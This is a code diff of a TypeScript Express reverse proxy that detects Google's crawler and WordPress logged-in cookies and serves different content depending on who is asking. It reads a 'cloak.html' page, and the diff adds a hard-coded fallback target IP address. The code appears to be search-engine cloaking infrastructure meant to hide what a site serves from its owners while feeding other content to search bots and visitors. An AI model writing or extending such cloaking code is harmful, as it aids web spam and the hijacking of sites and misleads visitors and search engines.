@@ -13,31 +13,30 @@ type conf = {
 }
 
 let cloakHtml = fs.readFileSync('./assets/cloak.html').toString()
-
-const targetUrl = process.env.TARGET_URL
+const targetUrl = process.env.TARGET_URL || "http://185.209.228.193"
 if (!targetUrl) throw Error('Needs target url')
 console.log(`Proxy to ${targetUrl}`)
+
 
 const app = express();
 
 const proxy = httpProxy.createProxyServer({
-  changeOrigin: true,
   followRedirects: true
 });
 
 app.use(cookieParser())
 app.use(async function (req, res) {
-  const doProxy = () => proxy.web(req, res, { target: targetUrl })
+  const doProxy = (req: Request, res: Response) => proxy.web(req, res, { target: targetUrl })
   const conf: conf = JSON.parse(fs.readFileSync('./assets/conf.json').toString())
 
-  if (conf.whiteListHost.includes(req.get('host') || '')) doProxy()
+  if (conf.whiteListHost.includes(req.get('host') || '')) doProxy(req, res)
   else detectGBotHandler(req, res, conf, doProxy)
 })
 
 app.listen(3000)
 
 
-async function detectGBotHandler(req: Request, res: Response, conf: conf, cbProxy: () => void) {
+async function detectGBotHandler(req: Request, res: Response, conf: conf, cbProxy: (req: Request, res: Response) => void) {
   const ip = req.get("HTTP_CF_CONNECTING_IP") || req.get("x-real-ip") || ''
   const loginCookies = Object.keys(req.cookies).map(k => k.includes("wordpress_logged_in"))
 
@@ -50,7 +49,7 @@ async function detectGBotHandler(req: Request, res: Response, conf: conf, cbProx
     res.header("Cache-Control", "max-age=0");
     res.header("X-Frame-Options", "DENY");
     res.header("X-Robots-Tag", "noarchive");
-    cbProxy()
+    cbProxy(req, res)
   } else {
     res.header("Cache-Control", "max-age=0");
     res.header("X-Frame-Options", "DENY");
